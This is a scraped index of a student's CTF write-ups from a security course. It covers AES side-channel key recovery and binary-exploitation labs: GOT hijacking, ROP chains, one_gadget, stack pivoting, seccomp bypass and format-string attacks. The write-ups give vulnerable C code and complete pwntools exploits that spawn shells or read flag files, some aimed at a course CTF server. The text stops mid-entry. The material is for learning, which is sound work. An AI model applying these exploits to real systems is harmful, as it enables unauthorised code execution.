choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(50): hex_value = \u0026#39;{0:0\u0026gt;2x}\u0026#39;.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count(\u0026#39;1\u0026#39;) return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in (ascii_letters + digits).encode():#trange(len(hw_model_col_result)): \u0026lt;- 加速的部分 for j in range(biggest_length): correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, data_offset = (0, len(j[0][\u0026#34;pm\u0026#34;]))): plt.plot(range(data_offset[0], data_offset[1]), j[offset][\u0026#34;pm\u0026#34;][data_offset[0]:data_offset[1]]) plt.savefig(fname=\u0026#34;pt_\u0026#34; + str(offset) + \u0026#34;.jpg\u0026#34;) plt.clf() # display_pt(0, (0, 95)) # display_pt(0) pt_col, ct_col, trace_col = data_preprocess(j) flag = \u0026#39;\u0026#39; biggest_length = 95# len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) flag += (ascii_letters + digits)[key_idx // biggest_length] # from Crypto.Util.number import long_to_bytes # flag += long_to_bytes(key_idx // biggest_length).decode(\u0026#34;cp437\u0026#34;) print(\u0026#39;The key of AES is: FLAG{\u0026#39; + flag + \u0026#39;}\u0026#39;) 有嘗試過只選擇常見可使用的字元也就是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789，以及trace只選擇前95個data，也可以正常解析出AES key並且算的更快(大約快77倍左右)\nFlag: FLAG{W0ckAwocKaWoCka1}\nReference # NTU Computer Security HW1 - AES\n"},{"id":374,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/","title":"Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)","section":"Securities","content":" Simple PWN - 0x06(GOT hijacking/Lab - got2win) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10004\nGOT Background # Lecture Vid. - Pwn week1 NTUSTISC - Pwn Basic 2 [2019.03.19]\nOriginal Code # :::spoiler Original Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; char flag[0x30]; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = open(\u0026#34;/home/chal/flag\u0026#34;, O_RDONLY); read(fd, flag, 0x30); close(fd); write(1, \u0026#34;Good luck !\\n\u0026#34;, 13); unsigned long addr = 0; printf(\u0026#34;Overwrite addr: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;addr); printf(\u0026#34;Overwrite 8 bytes value: \u0026#34;); read(0, (void *) addr, 0x8); printf(\u0026#34;Give me fake flag: \u0026#34;); int nr = read(1, flag, 0x30); if (nr \u0026lt;= 0) exit(1); flag[nr - 1] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;This is your flag: ctf{%s}... Just kidding :)\\n\u0026#34;, flag); return 0; } :::\nThe program read the flag first at line 13~16 At line 19~22, it allow user input an address and its value At line 25, you may think it\u0026rsquo;s weird that it use stdout as read function\u0026rsquo;s parameter. In addition, it doesn\u0026rsquo;t have buffer overflow, so that we can not use the technique before to get flag. Thus, our perspective is we can overlap the read GOT by write plt, so that it can execute write function: int nr=write(1, flag, 0x30); Exploit # First, we should find the address of read GOT and write plt gdb chal b *main() ni # Until write function si Then we wanna know read GOT address My exploit is: from pwn import * context.arch = \u0026#39;amd64\u0026#39; r=remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10004) context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] read_got = 0x404038 write_plt = 0x4010c0 r.sendlineafter(\u0026#39;Overwrite addr: \u0026#39;, str(read_got)) r.sendafter(\u0026#39;Overwrite 8 bytes value: \u0026#39;, p64(write_plt)) r.interactive() Then, we can use read function as write function to get flag FLAG{apple_1f3870be274f6c49b3e31a0c6728957f} Reference # PWN week1\n"},{"id":375,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x07rop/","title":"Simple PWN - 0x07(ROP)","section":"Securities","content":" Simple PWN - 0x07(ROP) # tags: CTF PWN eductf # Background # This is very similar to normal BOF. If a sample code that doesn\u0026rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode. Therefore, the main idea is use some \u0026lt;operation\u0026gt;;ret pattern segment to overlap stack. Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { setvbuf(stdin, 0, _IONBF, 0) setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf(\u0026#34;Here is your \\\u0026#34;/bin/sh\\\u0026#34;: %p\\n\u0026#34;, \u0026#34;/bin/sh\u0026#34;); printf(\u0026#34;Give me your ROP: \u0026#34;); read(0, s, 0x400); return 0; } At line 11, %p means pointer of /bin/sh string. Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection. In addition, please use -static command to compile library at compile time, so that we can get ROP gadget more easily. gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static Exploit # First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use ROP gadget to construct chain. Second, we use ROPgadget to find suitable gadget $ ROPgadget --multibr --binary rop \u0026gt; rop_gadget $ vim rop_gadget Note that, you may consider that pop rdx ; pop rbx ; ret is not what we want. We just want pop rdx ; ret. Therefore, we have to push one more value for pop rbx ; instruction. Then, we can construct our payload: from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./rop\u0026#39;) r.recvuntil(\u0026#39;Here is your \u0026#34;/bin/sh\u0026#34;: \u0026#39;) binsh = int(r.recvline()[:-1], 16) info(f\u0026#34;binsh: {hex(binsh)}\u0026#34;) pop_rdi_ret = 0x401eaf pop_rsi_ret = 0x409ede pop_rdx_ret = 0x485aeb pop_rax_ret = 0x44fcc7 syscall = 0x401c64 Note that, r.recvline()[:-1] is b'0x498004' and we must pop to %rdi at line 17 below. Then we can combine them together using flat method. It\u0026rsquo;ll flat the address with length 8 bytes. ROP = flat( pop_rdi_ret, binsh, pop_rsi_ret, 0, pop_rdx_ret, 0, 0, pop_rax_ret, 0x3b, syscall, ) gdb.attach(r) r.sendafter(\u0026#34;Give me your ROP: \u0026#34;, b\u0026#39;a\u0026#39; * 0x18 + ROP) r.interactive() Finally, we got shell!!! Analysis # This is totally the same as our hypothesis. We can see that all parameters are ready Reference # NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1\n"},{"id":376,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/","title":"Simple PWN - 0x08(one_gadget with ROP)","section":"Securities","content":" Simple PWN - 0x08(one_gadget with ROP) # tags: CTF PWN eductf # one_gadget background # Day25: [Misc] 我從來沒想過我會害怕寫 code\n原理是在 glibc 裡面有很多會透過 execve 執行 /bin/sh、再調用外部系統指令的 assembly，當 explolit 已經得知 libc 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數\nOriginal Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IOBNF, 0); char s[0x10]; printf(\u0026#34;Your libc: %p\u0026#34;, printf); read(0, s, 0x100); return 0; } The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use ROP to get shell. Note that, it must be a dynamic library, so DO NOT use -static to compile it. gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack Exploit # First, we use ldd command to find what library the program will use. In addition, we use one_gadget command to find execvs Note that, how to use it can refer to one_gadget用法 We use 0xebcf8 execve(\u0026quot;/bin/sh\u0026quot;, rsi, rdx) as our method Note: it has 3 constraint so that we can get the shell address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Then, we use one_gadget command to get ROP chain ROPgadget --binary one_gadget_with_rop --only \u0026#34;pop|ret\u0026#34; \u0026gt; one_gadget vim one_gadget You can see that because we didn\u0026rsquo;t compile with library, the gadget that we may can use is very few. The solution is using the gadget that libc have: $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026#34;pop|ret\u0026#34; \u0026gt; one_gadget $ vim one_gadget We must satisfied one_gadget constraint. 0x90529 and 0x2be51 are the offset of /lib/x86_64-linux-gnu/libc.so.6. Therefore, if we want to call these gadget, we must find out the real base address of /lib/x86_64-linux-gnu/libc.so.6. Because, ASLR is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the printf address in /lib/x86_64-linux-gnu/libc.so.6 → 0x7ffff7def770 Used gdb can find the current address of library → 0x7ffff7d8f000 Then we can know the offset and construct apart of payload as below $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$ from pwn import * import sys context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./one_gadget_with_rop\u0026#39;) r.recvuntil(\u0026#34;Your libc: \u0026#34;) libc = int(r.recv(14), 16) - 0x60770 info(f\u0026#34;libc: {hex(libc)}\u0026#34;) And prepare our gadget: pop_rdx_rbx_ret = libc + 0x90529 pop_rsi_ret = libc + 0x2be51 Construct whole payload with considering the constraint: r.send(b\u0026#39;a\u0026#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8)) r.interactivae() b'a'*0x10 is for $rsi p64(0x404000) is an arbitrary writable and readable address for $rbp-0x78 one of the constraint of one_gadget p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) is what we did in last lecture of ROP p64(libc+0xebcf8) is the one_gadget that we choose at the beginning. Finally, we got shell!!! Reference # Linux ldd 查看執行檔執行時需要哪些 library Pwn week1\n"},{"id":377,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/","title":"Simple PWN - 0x09(stack pivoting)","section":"Securities","content":" Simple PWN - 0x09(stack pivoting) # tags: CTF PWN eductf # Stack Pivoting background # NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1 It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed. More detailed info. can refer to Binary Exploitation (Pwn)\nOriginal Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char name[0x80] int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf(\u0026#34;Give me your name: \u0026#34;); read(0, name, 0x80); printf(\u0026#34;Give me your ROP: \u0026#34;); read(0, s, 0x20); return 0; } You can observe that it has not much stack buffer overflow can use, but it has global variable name with space 0x80(can be another stack) gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static Note that: must use mprotect to change permission of global variable name just like lecture 0x04, add these line in original code #include \u0026lt;sys/mman.h\u0026gt; mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC); Before mprotect - vmmap After mprotect - vmmap Exploit # Construct ROP chain\nobjdump -d -M Intel stack_pivoting | grep \u0026#34;\u0026lt;name\u0026gt;\u0026#34; ROPgadget --binary stack_pivoting --only \u0026#34;pop|ret|syscall|leave\u0026#34; \u0026gt; one_gadget vim one_gadget Find address of variable name\nobjdump -d -M Intel stack_pivoting | grep \u0026#34;\u0026lt;name\u0026gt;\u0026#34; Whole exploit :::spoiler Code\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./stack_pivoting\u0026#39;) raw_input() name = 0x4c70c0 leave_ret = 0x40182d pop_rdi_ret = 0x401ecf pop_rsi_ret = 0x409efe pop_rax_ret = 0x44fd07 pop_rdx_rbx_ret = 0x485b2b syscall = 0x401c84 ROP = b\u0026#39;/bin/sh\\x00\u0026#39; ROP += flat( pop_rdi_ret, name, pop_rsi_ret, 0, pop_rdx_rbx_ret, 0, 0, pop_rax_ret, 0x3b, syscall ) r.sendafter(\u0026#34;Give me your name: \u0026#34;, ROP) raw_input() r.sendafter(\u0026#34;Give me your ROP: \u0026#34;, b\u0026#39;a\u0026#39;*0x10 + p64(name) + p64(leave_ret)) r.interactive() :::\nFirst, write ROP chain to global variable name Next, use 2 leave ; ret to pivot name as a stack Finally, you got shell!!! Reference # mprotect.2 man trace 30個基本Linux系統呼叫第二十二日：mprotect\n"},{"id":378,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/","title":"Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)","section":"Securities","content":" Simple PWN - 0x10(seccomp/Lab - rop2win) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10005\nseccomp background # Pwn week1\nOriginal Code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; char fn[0x20]; char ROP[0x100]; // fd = open(\u0026#34;flag\u0026#34;, 0); // read(fd, buf, 0x30); // write(1, buf, 0x30); // 1 --\u0026gt; stdout int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_load(ctx); seccomp_release(ctx); printf(\u0026#34;Give me filename: \u0026#34;); read(0, fn, 0x20); printf(\u0026#34;Give me ROP: \u0026#34;); read(0, ROP, 0x100); char overflow[0x10]; printf(\u0026#34;Give me overflow: \u0026#34;); read(0, overflow, 0x30); return 0; } :::\nYou can observe that it just allow open, read, write system call, so our goal is read the flag in the server by using these allowable system call. It has global variable so that we can write ROP chain in it. You also can analyze the sample ELF file by seccomp-tools if there is no source code $ seccomp-tools dump ./chal line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x00000000 if (A == read) goto 0010 0006: 0x15 0x03 0x00 0x00000001 if (A == write) goto 0010 0007: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0010 0008: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0010 0009: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL ROW Background # According to open(2) — Linux manual page, it\u0026rsquo;ll return fd(file descriptor).\nThe open() system call opens the file specified by pathname. If the specified file does not exist, it may optionally (if O_CREAT is specified in flags) be created by open().\nThe return value of open() is a file descriptor, a small, nonnegative integer that is an index to an entry in the process\u0026rsquo;s table of open file descriptors. The file descriptor is used in subsequent system calls (read(2), write(2), lseek(2), fcntl(2), etc.) to refer to the open file. The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process.\nNote that, more info. about fd can refer to Linux 核心設計: 檔案系統概念及實作手法 (上) - 34:53, Linux 核心設計: 檔案系統概念及實作手法 (上) - 58:29, 理解linux中的file descriptor(文件描述符) According to read(2) — Linux manual page\nread() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.\nAccording to write(2) — Linux manual page\nwrite() writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.\nAccording to Linux System Call Table for x86 64\n%rax System Call %rdi %rsi %rdx %r10 %r8 %r9 0 sys_read unsigned int fd char *buf size_t count 1 sys_write unsigned int fd const char *buf size_t count 2 sys_open const char *filename int flags int mode Note that, flags argument in sys_open is: The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR. These request opening the file read-only, write-only, or read/write, respectively.\nmode argument can ignore Exploit - ROP + stack pivoting # Find the address of global variable that is fn and ROP $ objdump -d -M Intel chal | grep \u0026#34;\u0026lt;fn\u0026gt;\u0026#34; 40189c: 48 8d 05 9d 1a 0e 00 lea 0xe1a9d(%rip),%rax # 4e3340 \u0026lt;fn\u0026gt; $ objdump -d -M Intel chal | grep \u0026#34;\u0026lt;ROP\u0026gt;\u0026#34; 4018c9: 48 8d 05 90 1a 0e 00 lea 0xe1a90(%rip),%rax # 4e3360 \u0026lt;ROP\u0026gt; fn = 0x4e3340 ROP_addr = 0x4e3360 Find ROP gadget address $ ROPgadget --binary chal --multibr --only \u0026#34;pop|syscall|ret|leave\u0026#34; \u0026gt; one_gadget $ vim one_gadget pop_rax_ret = 0x45db87 pop_rdi_ret = 0x4038b3 pop_rsi_ret = 0x402428 pop_rdx_rbx_ret = 0x493a2b syscall_ret = 0x4284b6 leave_ret = 0x40190c Construct ROP chain ROP = flat( # Open filename # fd = open(\u0026#34;flag\u0026#34;, 0); pop_rax_ret, 2, pop_rdi_ret, fn, pop_rsi_ret, 0, syscall_ret, # Read the file # read(fd, buf, 0x30); pop_rax_ret, 0, pop_rdi_ret, 3, # we can oversee the fd is 3 because 0,1,2 are preserved by default pop_rsi_ret, fn, pop_rdx_rbx_ret, 0x30, 0, syscall_ret, # Write the file # write(1, buf, 0x30); // 1 --\u0026gt; stdout # the 2nd and 3rd argument are the same to read pop_rax_ret, 1, pop_rdi_ret, 1, syscall_ret, ) Write ROP chain to global variable(a new stack) r.sendafter(\u0026#34;Give me ROP:\u0026#34;, b\u0026#39;a\u0026#39;*0x8 + ROP) Note that, you must try and error to observe how many bytes you have to overlap by trash such as b'a'*0x8 Stack pivoting r.sendafter(\u0026#39;Give me overflow:\u0026#39;, b\u0026#39;a\u0026#39;*0x20 + p64(ROP_addr) + p64(leave_ret)) Note that, you must try and error to observe how many bytes you have to overlap by trash such as b'a'*0x20 Where is the flag file in remote server? You can build the docker and observe the relative position → /home/chal/flag r.sendafter(\u0026#34;Give me filename:\u0026#34;, \u0026#39;/home/chal/flag\\x00\u0026#39;) Then we got flag!!! Whole exploit :::spoiler code from pwn import * #r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10005) raw_input() context.arch = \u0026#39;amd64\u0026#39; fn = 0x4e3340 ROP_addr = 0x4e3360 pop_rax_ret = 0x45db87 pop_rdi_ret = 0x4038b3 pop_rsi_ret = 0x402428 pop_rdx_rbx_ret = 0x493a2b syscall_ret = 0x4284b6 leave_ret = 0x40190c ROP = flat( # Open filename pop_rax_ret, 2, pop_rdi_ret, fn, pop_rsi_ret, 0, syscall_ret, # Read the file pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, fn, pop_rdx_rbx_ret, 0x30, 0, syscall_ret, # Write the file pop_rax_ret, 1, pop_rdi_ret, 1, syscall_ret, ) r.sendafter(\u0026#34;Give me filename:\u0026#34;, \u0026#39;/home/chal/flag\\x00\u0026#39;) r.sendafter(\u0026#34;Give me ROP:\u0026#34;, b\u0026#39;a\u0026#39;*0x8 + ROP) r.sendafter(\u0026#39;Give me overflow:\u0026#39;, b\u0026#39;a\u0026#39;*0x20 + p64(ROP_addr) + p64(leave_ret)) r.interactive() ::: Reference # Linux 核心設計: 檔案系統概念及實作手法 (上)\n"},{"id":379,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/","title":"Simple PWN - 0x11(format string bug)","section":"Securities","content":" Simple PWN - 0x11(format string bug) # tags: CTF PWN eductf # format string bug background # printf %n Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char fmt[0x20]; system(\u0026#34;echo \u0026#39;Give me fmt: \u0026#39;\u0026#34;); read(0, fmt, 0x20); printf(fmt); system(\u0026#34;echo \u0026#39;Give me string: \u0026#39;\u0026#34;); read(0, fmt, 0x20); puts(fmt); return 0; } $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack In this problem, we can consider to use format string bug to achieve GOT hijacking without buffer overflow. The main idea is totally the same as GOT hijacking lecture Thus, we can observe which function can be overlapped by system plt → puts function Because\u0026hellip; puts just needs one argument like system function, but how about printf? Unfortunately, it appeared before 2nd read function, because 2nd read needs to store the argument for system function such as sh\\x00. Exploit - GOT hijacking + format string bug # Our goal is hijack puts GOT to system plt\nFind puts GOT address and system plt → 0x403318 and 0x401090\n$ objdump -d fmt ... 0000000000401090 \u0026lt;system@plt\u0026gt;: 401090: f3 0f 1e fa endbr64 401094: f2 ff 25 85 22 00 00 bnd jmp *0x2285(%rip) # 403320 \u0026lt;system@GLIBC_2.2.5\u0026gt; 40109b: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) ... $ gdb fmt ... pwndbg\u0026gt; attach \u0026lt;PID\u0026gt; pwndbg\u0026gt; got GOT protection: No RELRO | GOT functions: 5 [0x403318] puts@GLIBC_2.2.5 -\u0026gt; 0x401030 ◂— endbr64 [0x403320] system@GLIBC_2.2.5 -\u0026gt; 0x7f87de291d60 (system) ◂— endbr64 [0x403328] printf@GLIBC_2.2.5 -\u0026gt; 0x401050 ◂— endbr64 [0x403330] read@GLIBC_2.2.5 -\u0026gt; 0x7f87de355980 (read) ◂— endbr64 [0x403338] setvbuf@GLIBC_2.2.5 -\u0026gt; 0x7f87de2c2670 (setvbuf) ◂— endbr64 ... Construct format string - try and error\nr.sendafter(\u0026#34;Give me fmt: \u0026#34;, b\u0026#34;%176c%8$hhn\u0026#34; + b\u0026#34;aaaaa\u0026#34; + p64(puts_got)) 從結果來看比較清楚 Parse b\u0026quot;%176c%8$hhn\u0026quot; + b\u0026quot;aaaaa\u0026quot; + p64(puts_got) Our goal is overlap puts GOT, so we put address of puts_got at final position, that is [%rsp + 16](format string: $8) We want to modify 0x401030 to 0x401090, so we just modify only 1 bytes(format string: %hhn). In addition, 0x90 is 144 as decimal.(format string: %176c) Combine all format sting: %176c%8$hhn and other space can pad trash bytes Pass the command to system function - sh\\x00 to open shell\nr.sendafter(\u0026#34;Give me string: \u0026#34;, \u0026#34;sh\\x00\u0026#34;) Finally, we got shell!!! Whole exploit from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#34;./fmt\u0026#34;) raw_input() puts_got = 0x403318 system_plt = 0x401090 r.sendafter(\u0026#34;Give me fmt: \u0026#34;, b\u0026#34;%144c%8$hhn\u0026#34; + b\u0026#34;aaaaa\u0026#34; + p64(puts_got)) r.sendafter(\u0026#34;Give me string: \u0026#34;, \u0026#34;sh\\x00\u0026#34;) r.interactive() "},{"id":380,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/","title":"Simple PWN - 0x12(Lab - `rop++`)","section":"Securities","content":" Simple PWN - 0x12(Lab - rop++) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10004\nOriginal Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char buf[0x10]; const char *msg = \u0026#34;show me rop\\n\u0026gt; \u0026#34;; write(1, msg, strlen(msg)); read(0, buf, 0x200); return 0; } gcc -fno-stack-protector -static -o chal rop++.c Analyze # Obviously buffer overflow!!!\nCheck protector\n$ checksec chal [*] \u0026#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Preliminary idea is using ROP chain and get shell, but the problem is where can I write /bin/sh\\x00? We can use vmmap to observe where section is writable and readable → 0x4c5000~0x4c800 $ readelf -S chal ... [25] .bss NOBITS 00000000004c72a0 000c6290 0000000000005980 0000000000000000 WA 0 0 32 ... We can use .bss section(0x4c72a0) to write parameter /bin/sh\\x00\nNote that, because ASLR is enabled, so we cannot write /bin/sh\\x00 to stack, in addition, PIE is unable, so that we can write and read data from .bss section with fixed address Exploit - ROP # Write ROP chain in buf parameter $ ROPgadget --binary chal --only \u0026#34;pop|leave|ret|syscall\u0026#34; --multibr \u0026gt; rop_gadget $ vim rop_gadget pop_rax_ret = 0x447b27 pop_rdi_ret = 0x401e3f pop_rsi_ret = 0x409e6e pop_rdx_rbx_ret = 0x47ed0b syscall_ret = 0x414506 leave_ret = 0x401797 Construct ROP chain In order to achieve our idea, we need another read to write /bin/sh\\x00 to .bss section ROP_read = flat( # call read function pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, 0x4c72a0, pop_rdx_rbx_ret, 0x100, 0, syscall_ret, ) Then we need another ROP chain to call shell ROP_shell = flat( # Get shell pop_rax_ret, 0x3b, pop_rdi_ret, 0x4c72a0, pop_rsi_ret, 0, pop_rdx_rbx_ret, 0, 0, syscall_ret, ) Note that 0x4c72a0 is the beginning of .bss section Send payload binsh = 0x68732f6e69622f #\u0026#39;/bin/sh\\x00\u0026#39; r.sendafter(\u0026#34;show me rop\\n\u0026gt;\u0026#34;, b\u0026#39;a\u0026#39;*0x28 + ROP_read + ROP_shell) r.send(flat(binsh)) Then we get shell and read flag Whole exploit :::spoiler code from pwn import * #r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10003) raw_input() context.arch = \u0026#39;amd64\u0026#39; pop_rax_ret = 0x447b27 pop_rdi_ret = 0x401e3f pop_rsi_ret = 0x409e6e pop_rdx_rbx_ret = 0x47ed0b syscall_ret = 0x414506 leave_ret = 0x401797 binsh = 0x68732f6e69622f #\u0026#39;/bin/sh\\x00\u0026#39; ROP_read = flat( # call read function pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, 0x4c72a0, pop_rdx_rbx_ret, 0x100, 0, syscall_ret, ) ROP_shell = flat( # Get shell pop_rax_ret, 0x3b, pop_rdi_ret, 0x4c72a0, pop_rsi_ret, 0, pop_rdx_rbx_ret, 0, 0, syscall_ret, ) r.sendafter(\u0026#34;show me rop\\n\u0026gt;\u0026#34;, b\u0026#39;a\u0026#39;*0x28 + ROP_read + ROP_shell) r.send(flat(binsh)) r.interactive() ::: Appendix # This payload will call sys_read and read something that we send, that is 0x68732f6e69622f(/bin/sh\\x00), and then it\u0026rsquo;ll call sys_execve.\n"},{"id":381,"href":"/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/","title":"Simple PWN - 0x13(Lab - `how2know`)","section":"Securities","content":" Simple PWN - 0x13(Lab - how2know) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10002 Environment Version: 22.04\nOriginal Code # :::spoiler code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static char flag[0x30]; int main() { void *addr; int fd; scmp_filter_ctx ctx; addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if ((unsigned long)addr == -1) perror(\u0026#34;mmap\u0026#34;), exit(1); fd = open(\u0026#34;/home/chal/flag\u0026#34;, O_RDONLY); if (fd == -1) perror(\u0026#34;open\u0026#34;), exit(1); read(fd, flag, 0x30); close(fd); write(1, \u0026#34;talk is cheap, show me the code\\n\u0026#34;, 33); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); ((void(*)())addr)(); return 0; } :::\ngcc -o chal how2know.c -lseccomp $ checksec chal [*] \u0026#39;/home/sbk6401/NTUCS/PWN/Lab/how2know/share/chal\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled $ seccomp-tools dump ./chal talk is cheap, show me the code 123 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x06 0xc000003e if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000 A = 